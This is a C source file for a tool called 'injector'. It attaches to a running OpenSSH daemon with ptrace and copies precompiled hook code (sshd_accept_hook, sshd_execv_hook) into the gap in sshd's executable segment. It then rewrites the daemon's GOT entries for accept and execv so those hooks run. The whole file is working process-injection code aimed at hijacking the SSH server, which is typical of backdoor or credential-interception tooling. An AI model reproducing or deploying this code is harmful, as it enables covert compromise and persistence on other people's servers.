#include "assemble.h"
#include "got_offset.h"
#include "log.h"
#include "proc_map.h"
#include "seg_gap.h"
#include "sshd_accept_hook.h"
#include "sshd_execv_hook.h"
#include "trace_utils.h"
// clang-format off
#include <iso646.h>
#include <keystone/keystone.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

#define PADDING 0x10
#define SSHD_PATH "/usr/sbin/sshd"
#define SESSION_PATH "/usr/lib/ssh/sshd-session"

void
preprocess_code (uint64_t sshd_base)
{
  uint8_t sshd_rw_start[8];
  *((uint64_t *)sshd_rw_start)
      = sshd_base + get_seg_gap (SSHD_PATH, 6);

  uint8_t *mov_r9_text = assemble ("mov r9, 0x123456789abc");

  char *mov_r9 = memmem ((char *)sshd_accept, sizeof (sshd_accept), (char *)mov_r9_text, 0xa);
  memcpy (&mov_r9[2], sshd_rw_start, 0x8);
  mov_r9 = memmem ((char *)sshd_execv, sizeof (sshd_execv), (char *)mov_r9_text, 0xa);
  memcpy (&mov_r9[2], sshd_rw_start, 0x8);
  // replace the placeholder with sshd_rw_start

  ks_free (mov_r9_text);
}

int
main (int argc, char **argv)
{
  if (argc != 2)
    PEXIT ("usage: injector pid");
  uint32_t pid = strtol (argv[1], NULL, 0);

  attach (pid);
  // ptrace (PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);
  uint64_t sshd_base = parse_maps (pid, "r--p");
  preprocess_code (sshd_base);

  uint64_t accept_got = sshd_base + get_got_offset (SSHD_PATH, "accept");
  uint64_t execv_got = sshd_base + get_got_offset (SSHD_PATH, "execv");

  uint64_t sshd_rx_start = sshd_base + get_seg_gap (SSHD_PATH, 5);
  uint64_t sshd_rx_gap = sshd_rx_start % 0x1000;
  printf ("sshd_rx_gap: %lx", (0x1000 - sshd_rx_gap));

  copy_to_tracee (pid, sshd_rx_start, sshd_accept, sizeof (sshd_accept));
  copy_to_tracee (pid, accept_got, (uint8_t *)&sshd_rx_start, 0x8);

  uint64_t execv_hook_start
      = (sshd_rx_start + (sizeof (sshd_accept) & ~0x7)) + 0x8;
  copy_to_tracee (pid, execv_hook_start, sshd_execv, sizeof (sshd_execv));
  copy_to_tracee (pid, execv_got, (uint8_t *)&execv_hook_start, 0x8);

  detach (pid);
}
